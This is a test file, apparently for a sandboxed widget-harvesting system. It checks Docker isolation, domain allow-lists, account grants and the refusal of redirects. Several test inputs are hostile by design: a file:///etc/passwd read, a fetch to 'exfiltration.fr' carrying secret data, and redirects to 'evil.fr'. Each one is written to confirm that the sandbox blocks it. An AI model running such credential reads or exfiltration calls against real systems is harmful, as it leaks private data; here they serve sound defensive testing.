import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import { PassThrough } from "node:stream";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdir, readFile, rm, stat, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { join } from "node:path";
import { spacePaths } from "../../src/paths.js";
import { readHome } from "../../src/home/read.js";
import { Workshop, IMAGE } from "../../src/container/workshop.js";
import { DeclarationWidget, type WidgetLu } from "../../src/home/schemas.js";
import { writeData, writeWidgetState, readWidgetState, deleteData } from "../../src/home/data.js";
import { LocalAi } from "../../src/ai/local-ai.js";
import { FakeBridge } from "../../src/mcp/fake-bridge.js";
import { giveGrant, readGrants, removeGrant } from "../../src/widgets/grants.js";
import { kernelError, runAttempt, runHarvest, type ProcessLauncher } from "../../src/widgets/harvest.js";
import { PROFILE_DENIED } from "../../src/workflows/run.js";
import { writeRun, attemptId, readRun, listRuns, type Execution } from "../../src/workflows/executions.js";
import { withMemory, writeMemory, readMemory } from "../../src/workflows/memory.js";
import { Pacing } from "../../src/workflows/pacing.js";
import { searchUrl } from "../../src/workflows/duckduckgo.js";
import { tempFolder } from "../helpers/temp.js";
import { fakeRunner } from "../helpers/fake-runner.js";
import { fakeKev, fakeOllama, type FakeServer } from "../helpers/fake-ai.js";

const ENGINE = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(ENGINE, "recolteur.mjs");
const NOW = new Date("2026-10-28T10:00:00.000Z");
const clock = () => NOW;

const toClose: { fermer(): Promise<void> }[] = [];
const aiToStop: LocalAi[] = [];
afterEach(async () => {
  await Promise.all(toClose.splice(0).map((s) => s.fermer()));
  await Promise.all(aiToStop.splice(0).map((i) => i.arreter()));
});

/** Small HTTP server: `routes[chemin]` answers. */
async function webServer(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requests: { url: string; enTetes: Record<string, unknown> }[] = [];
  const s: Server = createServer((req, res) => {
    requests.push({ url: req.url ?? "", enTetes: req.headers });
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const server = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes: requests,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  toClose.push(server);
  return server;
}

interface Context {
  widget: WidgetLu & { declaration: DeclarationWidget };
  dossierWidgets: string;
  espace: string;
  commandes: string[][];
  tues: number;
  executer: ReturnType<typeof fakeRunner>;
  atelier: Workshop;
  lancer: ProcessLauncher;
}

/** Creates a widget `id` (widget.json + recolte.mjs) and a launcher that runs the harvester locally, without docker. */
async function prepare(id: string, code: string, sources = { compte: [] as string[], publiques: [] as string[] }, config: unknown = { a: 1 }): Promise<Context> {
  const space = await tempFolder();
  const folder = join(space, "accueil", "widgets", id);
  await mkdir(folder, { recursive: true });
  const raw = {
    nom: "Test",
    tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } },
    recolte: { minutes: 60 },
    sources,
    config,
  };
  await writeFile(join(folder, "widget.json"), JSON.stringify(raw));
  await writeFile(join(folder, "recolte.mjs"), code);
  const declaration = DeclarationWidget.parse(raw);
  const run = fakeRunner([]);
  const ctx: Context = {
    widget: {
      id,
      dossier: folder,
      declaration,
      etat: { statut: "ok", derniereMaj: null, derniereTentative: null },
      donnees: null,
      exemple: null,
      aRecolte: true,
      aWorkflow: false,
      aAffichage: true,
    },
    dossierWidgets: await tempFolder(),
    espace: space,
    commandes: [],
    tues: 0,
    executer: run,
    atelier: new Workshop({ chemins: spacePaths(space), docker: "docker", executer: run.executer }),
    lancer: (cmd, args) => {
      ctx.commandes.push([cmd, ...args]);
      const e = spawn(process.execPath, [SCRIPT, folder], { stdio: ["pipe", "pipe", "pipe"] });
      return {
        stdin: e.stdin,
        stdout: e.stdout,
        stderr: e.stderr,
        tuer: () => {
          ctx.tues++;
          e.kill("SIGKILL");
        },
        fin: new Promise((ok) => e.on("close", (c) => ok(c))),
      };
    },
  };
  return ctx;
}

async function ai(o: { kev?: FakeServer; ollama?: FakeServer } = {}) {
  const i = new LocalAi({ dossier: await tempFolder(), executer: fakeRunner([]).executer, kevUrl: o.kev?.url ?? "http://127.0.0.1:9", ollamaUrl: o.ollama?.url ?? "http://127.0.0.1:9" });
  aiToStop.push(i);
  return i;
}

const readBridge = (deny: string[] = [], redirections?: Record<string, string>) =>
  new FakeBridge([], {
    actif: null,
    autoriser: false,
    lecture: {
      pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [{ texte: "a", url: "https://app.daily.dev/a" }] }],
      refuser: deny,
      redirections,
    },
  });

const readCalls = (p: FakeBridge) => p.appels.filter((a) => a.methode === "lirePageInvisible");

async function harvest(ctx: Context, o: { ia?: LocalAi | Pick<LocalAi, "kev" | "gemma">; pont?: FakeBridge; delaiMs?: number } = {}) {
  return runHarvest({
    id: ctx.widget.id,
    widget: ctx.widget,
    dossierWidgets: ctx.dossierWidgets,
    moteur: ENGINE,
    atelier: ctx.atelier,
    lancer: ctx.lancer,
    ia: (o.ia ?? (await ai())) as LocalAi,
    pont: o.pont ?? readBridge(),
    horloge: clock,
    delaiMs: o.delaiMs,
    adressesLocales: true,
  });
}

const optionsOf = (ctx: Context) => ({
  id: ctx.widget.id,
  widget: ctx.widget as WidgetLu,
  dossierWidgets: ctx.dossierWidgets,
  moteur: ENGINE,
  atelier: ctx.atelier,
  lancer: ctx.lancer,
  ia: null,
  pont: readBridge(),
  horloge: clock,
  adressesLocales: true,
});

const readJson = async (path: string) => JSON.parse(await readFile(path, "utf8"));

describe("runHarvest", () => {
  it("a successful harvest writes donnees.json and the ok state in dossierWidgets", async () => {
    const web = await webServer({ "/flux.json": (res) => { res.writeHead(200, { "content-type": "application/json" }); res.end('{"x":42}'); } });
    const kev = await fakeKev({ q: { type: "noul", noul: 0.8 } });
    const ollama = await fakeOllama("bonjour");
    toClose.push(kev, ollama);
    const ctx = await prepare(
      "meteo",
      `export default async (w) => {
        const j = await w.recuperer("${web.url}/flux.json", { format: "json" });
        const p = await w.lirePage("https://app.daily.dev/");
        const k = await w.kev("etat", { q: { type: "noul", instructions: "?" } });
        const g = await w.gemma("salut");
        w.journal("trace du widget");
        return { j, titre: p.titre, k, g, cfg: w.config, prec: w.precedent, quand: w.maintenant };
      };`,
    );
    await writeData(ctx.dossierWidgets, "meteo", { ancien: true });
    const bridge = readBridge();
    const r = await harvest(ctx, { ia: await ai({ kev, ollama }), pont: bridge });

    const expected = {
      j: { x: 42 },
      titre: "Fil",
      k: { q: { type: "noul", noul: 0.8 } },
      g: "bonjour",
      cfg: { a: 1 },
      prec: { ancien: true },
      quand: NOW.toISOString(),
    };
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual(expected);
    expect(await readJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual(expected);
    const state = await readWidgetState(ctx.dossierWidgets, "meteo");
    expect(state).toMatchObject({ statut: "ok", derniereMaj: NOW.toISOString(), derniereTentative: NOW.toISOString() });
    expect(state.journal).toContain("trace du widget");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null, adressesLocales: true }]);
    // No cookie or identifier sent.
    expect(web.requetes[0]!.enTetes.cookie).toBeUndefined();
    expect(web.requetes[0]!.enTetes.authorization).toBeUndefined();
    // Nothing is written in the space.
    expect(existsSync(join(ctx.widget.dossier, "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.widget.dossier, "etat.json"))).toBe(false);
    // The launcher receives the workshop's docker command.
    expect(ctx.commandes[0]).toEqual(ctx.atelier.commandeRecolte("meteo", ctx.widget.dossier, ENGINE));
  });

  it("commandeRecolte mounts the widget as :ro, cuts the network (--network none) and mounts nothing else from the space", async () => {
    const workshop = new Workshop({ chemins: spacePaths("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const c = workshop.commandeRecolte("meteo", "/Users/t/WebAiOs/accueil/widgets/meteo", "/app/docker/moteur");
    expect(c).toEqual([
      "/usr/local/bin/docker", "run", "-i", "--rm",
      "--name", "webaios-recolte-meteo",
      "--network", "none",
      "--read-only",
      "--tmpfs", "/tmp",
      "-v", "/Users/t/WebAiOs/accueil/widgets/meteo:/widget:ro",
      "-v", "/app/docker/moteur:/opt/webaios/moteur:ro",
      "--memory", "512m",
      "--pids-limit", "128",
      IMAGE,
      "timeout", "-k", "5", "180",
      "node", "/opt/webaios/moteur/recolteur.mjs", "/widget",
    ]);
    const volumes = c.flatMap((x, i) => (c[i - 1] === "-v" ? [x] : []));
    expect(volumes).toHaveLength(2);
    expect(volumes.every((v) => v.endsWith(":ro"))).toBe(true);
    expect(c.filter((x) => x.includes("/Users/t/WebAiOs")).every((x) => x.startsWith("/Users/t/WebAiOs/accueil/widgets/meteo:"))).toBe(true);
    expect(() => workshop.commandeRecolte("../x", "/d", "/r")).toThrow();
    expect(() => new Workshop({ chemins: spacePaths("/Users/t/WebAiOs"), docker: null }).commandeRecolte("meteo", "/d", "/r")).toThrow();
  });

  it("supprimerRecolte forces the container's removal", async () => {
    const ctx = await prepare("meteo", "export default async () => 1;");
    await ctx.atelier.supprimerRecolte("meteo");
    expect(ctx.executer.appels.map((a) => [a.commande, ...a.args])).toEqual([["docker", "rm", "-f", "webaios-recolte-meteo"]]);
  });

  it("a harvest that fails keeps the previous data and records the error and the log", async () => {
    const ctx = await prepare("meteo", `export default async (w) => { console.log("avant l'erreur"); throw new Error("boum ${"x".repeat(900)}"); };`);
    await writeData(ctx.dossierWidgets, "meteo", { ancien: true });
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("erreur");
    expect(r.donnees).toBeUndefined();
    expect(r.etat.erreur).toContain("boum");
    expect(r.etat.erreur!.length).toBeLessThanOrEqual(500);
    expect(r.etat.journal).toContain("avant l'erreur");
    expect(r.etat.derniereTentative).toBe(NOW.toISOString());
    expect(await readJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual({ ancien: true });
    expect(await readWidgetState(ctx.dossierWidgets, "meteo")).toEqual(r.etat);
  });

  it("the log keeps the last 2,000 characters of the error output", async () => {
    const ctx = await prepare("meteo", `export default async (w) => { for (let i = 0; i < 500; i++) w.journal("ligne " + i); return 1; };`);
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("ok");
    expect(r.etat.journal!.length).toBeLessThanOrEqual(2000);
    expect(r.etat.journal).toContain("ligne 499");
    expect(r.etat.journal).not.toContain("ligne 1\n");
  });

  it("a non-zero output without an end is an error", async () => {
    const ctx = await prepare("meteo", `export default async () => { process.exit(3); };`);
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("erreur");
    expect(r.etat.erreur).toContain("3");
  });

  it("timeout exceeded: process killed, error state « Délai dépassé »", async () => {
    const ctx = await prepare("lent", `export default () => new Promise(() => {});`);
    await writeData(ctx.dossierWidgets, "lent", { ancien: true });
    const start = Date.now();
    const r = await harvest(ctx, { delaiMs: 600 });
    expect(Date.now() - start).toBeLessThan(5000);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
    expect(ctx.tues).toBeGreaterThan(0);
    expect(ctx.executer.appels.some((a) => a.args.join(" ") === "rm -f webaios-recolte-lent")).toBe(true);
    expect(await readJson(join(ctx.dossierWidgets, "lent", "donnees.json"))).toEqual({ ancien: true });
  });

  it("a line over 4 MB kills the harvest: « Réponse trop grande »", async () => {
    const ctx = await prepare("gros", `export default async () => { process.stdout.write("x".repeat(5 * 1024 * 1024)); await new Promise(() => {}); };`);
    const r = await harvest(ctx);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Réponse trop grande" });
    expect(ctx.tues).toBeGreaterThan(0);
  });

  it("several in-flight calls each receive their own response", async () => {
    const web = await webServer({
      "/lent": (res) => setTimeout(() => res.end("lent"), 300),
      "/vite": (res) => res.end("vite"),
    });
    const ctx = await prepare(
      "multi",
      `export default async (w) => Promise.all([w.recuperer("${web.url}/lent"), w.recuperer("${web.url}/vite"), w.recuperer("${web.url}/vite")]);`,
    );
    const r = await harvest(ctx);
    expect(r.donnees).toEqual(["lent", "vite", "vite"]);
  });

  it("recuperer: http(s) only, without credentials in the URL", async () => {
    const ctx = await prepare(
      "public",
      `const essai = (p) => p.then(() => "ok", (e) => e.message);
      export default async (w) => [
        await essai(w.recuperer("file:///etc/passwd")),
        await essai(w.recuperer("https://moi:secret@exemple.fr/")),
        await essai(w.recuperer("pas une url")),
      ];`,
    );
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("ok");
    const [file, identifiers, invalid] = r.donnees as string[];
    expect(file).toMatch(/http/);
    expect(identifiers).toMatch(/identifiants/i);
    expect(invalid).toMatch(/invalide/i);
  });

  it("recuperer: a local address is refused by default", async () => {
    const web = await webServer({ "/": (res) => res.end("secret local") });
    const ctx = await prepare("public", `export default async (w) => w.recuperer("${web.url}/").catch((e) => e.message);`);
    const r = await runHarvest({
      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, moteur: ENGINE, atelier: ctx.atelier,
      lancer: ctx.lancer, ia: await ai(), pont: readBridge(), horloge: clock,
    });
    expect(r.donnees).toMatch(/locale/);
    expect(web.requetes).toHaveLength(0);
  });

  it("recuperer: « localhost. » (trailing dot) is a local address, refused", async () => {
    const web = await webServer({ "/": (res) => res.end("secret local") });
    const ctx = await prepare(
      "public",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.recuperer("http://localhost.:${web.port}/")), await essai(w.lirePage("http://localhost.:${web.port}/"))];`,
    );
    const bridge = readBridge();
    const r = await runHarvest({
      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, moteur: ENGINE, atelier: ctx.atelier,
      lancer: ctx.lancer, ia: await ai(), pont: bridge, horloge: clock,
    });
    const [rec, page] = r.donnees as string[];
    expect(rec).toMatch(/^refus: .*locale/);
    expect(page).toMatch(/^refus: .*locale/);
    expect(web.requetes).toHaveLength(0);
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("recuperer: response over 5 MB refused", async () => {
    const web = await webServer({ "/gros": (res) => res.end("x".repeat(5 * 1024 * 1024 + 10)) });
    const ctx = await prepare("public", `export default async (w) => w.recuperer("${web.url}/gros").then((t) => t.length, (e) => e.message);`);
    const r = await harvest(ctx);
    expect(r.donnees).toMatch(/5 Mo/);
  });

  it("without lirePageInvisible, lirePage answers « Lecture de pages indisponible »", async () => {
    const ctx = await prepare("public", `export default async (w) => w.lirePage("https://a.fr/").catch((e) => e.message);`);
    const r = await harvest(ctx, { pont: new FakeBridge([], { actif: null, autoriser: false }) });
    expect(r.donnees).toBe("Lecture de pages indisponible");
  });

  it("widget without an account: lirePage with an account is refused", async () => {
    const ctx = await prepare("public", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).catch((e) => e.message);`);
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    expect(r.donnees).toMatch(/non déclaré/);
    expect(readCalls(bridge)).toHaveLength(0);
  });
});

describe("runHarvest, widget with an account", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };

  it("widget with an account: lirePage compte without a grant → accord-requis, no read", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { ancien: true });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    expect(r.etat.statut).toBe("accord-requis");
    expect(readCalls(bridge)).toHaveLength(0);
    expect(await readJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ ancien: true });
    expect((await readWidgetState(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
  });

  it("grant removed during the harvest: the read with an account does not happen, accord-requis", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => { await w.kev("x", {}); return w.lirePage("https://app.daily.dev/", { compte: true }); };`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const fake = {
      kev: async () => { await removeGrant(ctx.dossierWidgets, "daily"); return {}; },
      gemma: async () => "",
    };
    const r = await harvest(ctx, { pont: bridge, ia: fake });
    expect(r.etat.statut).toBe("accord-requis");
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("with a valid grant, lirePage compte reads in the grant's profile", async () => {
    const ctx = await prepare("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toBe("articles");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("lirePage compte to a domain not declared as account is refused", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://evil.fr/", { compte: true }).catch((e) => e.message);`, sources);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    expect(r.donnees).toMatch(/non déclaré/);
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("widget with an account: recuperer to an undeclared domain is refused", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    const ctx = await prepare(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
        await essai(w.recuperer("http://localhost:${web.port}/")),
        await essai(w.lirePage("https://exfiltration.fr/")),
        await essai(w.recuperer("${web.url}/")),
      ];`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    const [external, otherName, page, declare] = r.donnees as string[];
    expect(external).toMatch(/^refus: .*non déclaré/);
    expect(otherName).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("widget with an account: a redirect to an undeclared domain is refused", async () => {
    const target = await webServer({ "/fuite": (res) => res.end("fuite") });
    const web = await webServer({
      "/redir": (res) => { res.writeHead(302, { location: `http://localhost:${target.port}/fuite` }); res.end(); },
      "/redir-ok": (res) => { res.writeHead(301, { location: "/fin" }); res.end(); },
      "/fin": (res) => res.end("arrivé"),
    });
    const ctx = await prepare(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.recuperer("${web.url}/redir")), await essai(w.recuperer("${web.url}/redir-ok"))];`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await harvest(ctx);
    const [leak, ok] = r.donnees as string[];
    expect(leak).toMatch(/^refus: .*non déclaré/);
    expect(ok).toBe("arrivé");
    expect(target.requetes).toHaveLength(0);
  });

  it("widget with an account and without public ones: no public fetch", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    const ctx = await prepare("daily", `export default async (w) => w.recuperer("${web.url}/").catch((e) => "refus: " + e.message);`, { compte: ["app.daily.dev"], publiques: [] });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
    const r = await harvest(ctx);
    expect(r.donnees).toMatch(/^refus: .*non déclaré/);
    expect(web.requetes).toHaveLength(0);
  });

  it("a declared domain written with a trailing dot is the same domain", async () => {
    const ctx = await prepare(
      "daily",
      `const essai = (p) => p.then((x) => x.titre ?? x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.lirePage("https://app.daily.dev./", { compte: true })),
        await essai(w.lirePage("https://evil.fr./", { compte: true })),
      ];`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    const [declare, other] = r.donnees as string[];
    expect(declare).not.toMatch(/^refus/);
    expect(other).toMatch(/^refus: .*non déclaré/);
    expect(readCalls(bridge).map((a) => a.args[0])).toEqual(["https://app.daily.dev./"]);
  });

  it("lirePage compte redirected outside the account domains: refused, the text does not leave", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).then((p) => p.texte, (e) => "refus: " + e.message);`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = new FakeBridge([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://evil.fr/vole", titre: "Ailleurs", texte: "texte secret", liens: [] }],
        redirections: { "https://app.daily.dev/": "https://evil.fr/vole" },
      },
    });
    const r = await harvest(ctx, { pont: bridge });
    expect(r.donnees).toMatch(/^refus: Page refusée.*evil\.fr/);
    expect(JSON.stringify(r.donnees)).not.toContain("texte secret");
    expect(readCalls(bridge)[0]!.args[1]).toEqual({ profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true });
  });

  it("public lirePage of a widget with an account: public domains passed to the bridge, redirect outside the list refused", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => w.lirePage("http://127.0.0.1/?d=secret").then((p) => p.texte, (e) => "refus: " + e.message);`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = new FakeBridge([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://evil.fr/?d=secret", titre: "", texte: "ailleurs", liens: [] }],
        redirections: { "http://127.0.0.1/?d=secret": "https://evil.fr/?d=secret" },
      },
    });
    const r = await harvest(ctx, { pont: bridge });
    expect(r.donnees).toMatch(/^refus: Page refusée.*non déclaré/);
    expect(readCalls(bridge)[0]!.args[1]).toEqual({ profil: null, domaines: ["127.0.0.1"], adressesLocales: true });
  });

  it("without the adressesLocales option, the bridge does not receive adressesLocales (it then refuses local addresses)", async () => {
    const ctx = await prepare("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/")).titre;`);
    const bridge = readBridge();
    const r = await runHarvest({ ...optionsOf(ctx), pont: bridge, adressesLocales: false });
    expect(r.donnees).toBe("Fil");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null }]);
  });

  it("ProfileDenied from the bridge: grant removed, state accord-requis", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { ancien: true });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    await giveGrant(ctx.dossierWidgets, "autre", { domaines: ["a.fr"], publiques: [], profil: "perso" });
    const r = await harvest(ctx, { pont: readBridge(["prive"]) });
    expect(r.etat.statut).toBe("accord-requis");
    expect(r.etat.erreur).toBeTruthy();
    expect(await readGrants(ctx.dossierWidgets)).toEqual({ autre: { domaines: ["a.fr"], publiques: [], profil: "perso" } });
    // The data read with this account leaves with the grant.
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
  });

  it("ProfileDenied then account removed: the public harvest receives nothing of the account, nor does the home", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    expect((await harvest(ctx, { pont: readBridge(["prive"]) })).etat.statut).toBe("accord-requis");
    // The agent removes the account: the widget becomes public again (neither account nor grant).
    const raw = { nom: "Test", tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } }, recolte: { minutes: 60 }, sources: { compte: [], publiques: [] } };
    await writeFile(join(ctx.widget.dossier, "widget.json"), JSON.stringify(raw));
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), "export default async (w) => ({ prec: w.precedent });");
    const home = await readHome(spacePaths(ctx.espace), ctx.dossierWidgets);
    const lu = home.widgets.find((w) => w.id === "daily")!;
    expect("donnees" in lu && lu.donnees).toBeNull(); // what donnees_widget would return
    const r = await runHarvest({ ...optionsOf(ctx), widget: lu });
    expect(r.donnees).toEqual({ prec: null });
  });

  it("declaration modified (domains changed): the grant is removed and the previous data erased", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("accord-requis");
    expect(await readGrants(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
  });

  it("account removed from the declaration with a recorded grant: grant removed, data erased, precedent null", async () => {
    const ctx = await prepare("daily", `export default async (w) => ({ prec: w.precedent });`, { compte: [], publiques: [] });
    await writeData(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual({ prec: null });
    expect(await readGrants(ctx.dossierWidgets)).toEqual({});
    expect(await readJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ prec: null });
  });

  it("erreurDuNoyau: fixed kernel messages recognized, widget text not", () => {
    expect(kernelError("Délai dépassé")).toBe(true);
    expect(kernelError("Réponse trop grande")).toBe(true);
    expect(kernelError("Accord requis pour lire avec ton compte : app.daily.dev")).toBe(true);
    // Written with the widget's exit code: counts as widget text.
    expect(kernelError("La récolte s'est arrêtée sans résultat (code 1)")).toBe(false);
    expect(kernelError("Mise à jour impossible : atelier arrêté")).toBe(true);
    expect(kernelError("SECRET")).toBe(false);
    expect(kernelError("Délai dépassé SECRET")).toBe(false);
    expect(kernelError("La récolte s'est arrêtée sans résultat (code 1) SECRET")).toBe(false);
  });

  it("a grant whose domains no longer match the declaration is no longer valid", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    expect(r.etat.statut).toBe("accord-requis");
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("error thrown by the widget: never marked as the kernel's, even when it imitates a kernel message", async () => {
    for (const imitation of [
      "Accord requis pour lire avec ton compte : " + (123456789).toString(36),
      "La récolte s'est arrêtée sans résultat (code 123456789)",
    ]) {
      const ctx = await prepare(
        "daily",
        `export default async (w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); throw new Error(${JSON.stringify(imitation)}); };`,
        sources,
      );
      await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
      const r = await harvest(ctx);
      expect(r.etat).toMatchObject({ statut: "erreur", erreur: imitation });
      expect(r.etat.erreurNoyau).toBeUndefined();
      expect((await readWidgetState(ctx.dossierWidgets, "daily")).erreurNoyau).toBeUndefined();
    }
  });

  it("errors written by the kernel: marked as such (grant required, timeout exceeded)", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await harvest(ctx);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect((await readWidgetState(ctx.dossierWidgets, "daily")).erreurNoyau).toBe(true);
    const slow = await prepare("lent", `export default () => new Promise(() => {});`);
    expect((await harvest(slow, { delaiMs: 300 })).etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé", erreurNoyau: true });
  });

  it("grant refused during the harvest, after the read with an account: nothing is written, accord-requis", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => { const p = await w.lirePage("https://app.daily.dev/", { compte: true }); await w.kev("x", {}); return p.texte; };`,
      sources,
    );
    await writeData(ctx.dossierWidgets, "daily", { ancien: true });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    // What refuserAccord does: grant removed, data erased.
    const fake = {
      kev: async () => {
        await removeGrant(ctx.dossierWidgets, "daily");
        await deleteData(ctx.dossierWidgets, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await harvest(ctx, { pont: bridge, ia: fake });
    expect(readCalls(bridge)).toHaveLength(1);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
